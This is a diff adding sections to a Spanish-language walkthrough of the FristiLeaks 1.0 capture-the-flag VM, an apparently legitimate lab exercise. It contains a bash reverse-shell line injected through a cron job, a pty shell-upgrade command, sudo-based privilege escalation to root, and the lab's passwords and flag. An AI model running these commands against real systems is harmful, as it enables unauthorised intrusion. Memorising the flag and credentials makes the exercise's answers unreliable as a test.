@@ -291,15 +291,167 @@ sh-4.1$ pwd
 pwd
 sh-4.1$ 
 ```
+---
 
+## **Reconocimiento**
 
 ---
 
+Dentro de la carpeta ``/var/www`` se puede encontrar un archivo llamado ``notes.txt`` con el siguiente contenido:
+
+```console
+hey eezeepz your homedir is a mess, go clean it up, just dont delete
+the important stuff.
+
+-jerry
+```
+
+Ya tengo el nombre de dos usuarios: **eezeepz y jerry**
+
+Dentro de la carpeta ``/var/www/fristi`` se encuentra un archivo llamado ``checklogin.php`` y contiene las credenciales para la base de datos:
+
+```console
+<?php
+
+ob_start();
+$host="localhost"; // Host name
+$username="eezeepz"; // Mysql username
+$password="4ll3maal12#"; // Mysql password
+$db_name="hackmenow"; // Database name
+$tbl_name="members"; // Table name
+```
+Yendo a la carpeta ``/home`` se encuentarn 3 carpetas de usuarios: **admin, eezeepz y fristigod**. La única carpeta accesible es la eezeepz y contiene varios comandos o utilidades de Linux y un interesante archivo llamado ``notes.txt``. Nuevamente una nota de Jerry con pistas...
+
+```console
+Yo EZ,
+
+I made it possible for you to do some automated checks, 
+but I did only allow you access to /usr/bin/* system binaries. I did
+however copy a few extra often needed commands to my 
+homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
+from /home/admin/
+
+Don't forget to specify the full path for each binary!
+
+Just put a file called "runthis" in /tmp/, each line one command. The 
+output goes to the file "cronresult" in /tmp/. It should 
+run every minute with my account privileges.
+
+- Jerry
+```
+Entonces el hay un cronjob que busca el archivo ``runthis`` en ``/tmp`` y ejecuta lo que hay, previamente validando que el comando empiece con ``/home/admin``. Después de tratar un par de cosas terminé haciendo que el archivo ``runthis`` ejecute una shell reversa con bash con los privilegios del usuario **admin** lo cual me permitió ingresar a su directorio home.
+
+> **``/home/admin/../../bin/bash -i >& /dev/tcp/10.0.0.122/4444 0>&1``**
+
+Exito!!
+
+Hay 3 archivos importantes dentro de la carpeta home del usuario *admin*:
+ - cryptedpass.txt
+ - whoisyourgodnow.txt
+ - cryptpass.py
+
+El archivo ``cryptedpass.txt`` parece ser el resultante de de una cadena te texto que se la pasa al script ``cryptpass.py`` y no es más que una codificación **Base64** y una posterior **Rot13**:
+
+---
+
+```console
+#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
+import base64,codecs,sys
+
+def encodeString(str):
+    base64string= base64.b64encode(str)
+    return codecs.encode(base64string[::-1], 'rot13')
+
+cryptoResult=encodeString(sys.argv[1])
+print cryptoResult
+```
+
+---
+
+
+Los archivos ``whoisyoutgodnow.txt`` y ``cryptedpass.txt`` están ambos encriptados con el script mencionado. Modificando un poco el codigo de script o usando portales online para desencriptarlos da como resultado que son el password de los usuarios **fristigod** y **admin** respectivamente.
+
+Volviendo a nuestro shell reverso sin privilegios del principio hay que lograr una terminal buena y gracias a que la VM victima tiene **Python** instalado se hace corriendo el suguiente comando:
+
+>**``python -c 'import pty; pty.spawn("/bin/sh")'``**
+
+Una vez que se obtiene la terminal se puede pasar a los usuarios con mayores privilegios a través del comando ``su``:
+
+```console
+python -c 'import pty; pty.spawn("/bin/sh")'
+sh-4.1$ su admin
+su admin
+Password: thisisalsopw123
+
+[admin@localhost tmp]$ whoami
+whoami
+admin
+[admin@localhost tmp]$ su fristigod
+su fristigod
+Password: LetThereBeFristi!
+
+bash-4.1$ whoami
+whoami
+fristigod
+```
+---
+
+Voy a saltear al usuario admin e ir directamente a **Fristigod**...
+
+---
+
+Como último escalamiento de privilegios solo resta llegar a **root**, ejecutando el comando ``sudo -l`` se reveló información importante:
+
+> **``sudo -l``**
+
+```console
+Matching Defaults entries for fristigod on this host:
+    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
+    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
+    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
+    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
+    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User fristigod may run the following commands on this host:
+    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
+```
+
+A lo que hay que prestar atención acá es que dice que el usuario **fristi** (no fristigod) pueden correr el comando ``/var/fristigod/.secret_admin_stuff/doCom`` con ```sudo``. Entonces el parámetro ``-u [usuario]`` de ``sudo`` nos permite hacer lo que necesitamos.
+
+>**``sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom``**
+
+```console
+Usage: ./program_name terminal_command
+```
+---
+
+Al correr el comando se necesita un terminal_command. ¿Que tal si ese comando es ``/bin/bash``?
+
+```console
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
+bash-4.1# whoami
+whoami
+root
+```
+---
 
 ### **Flag**
 
 ---
+Dentro de la carpeta ``/root`` existe una archivo llamado ``fristileaks_secrets.txt`` su contenido:
 
+```console
+Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
+
+I wonder if you beat it in the maximum 4 hours it's supposed to take!
+
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
+
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+```
 
 ---
 
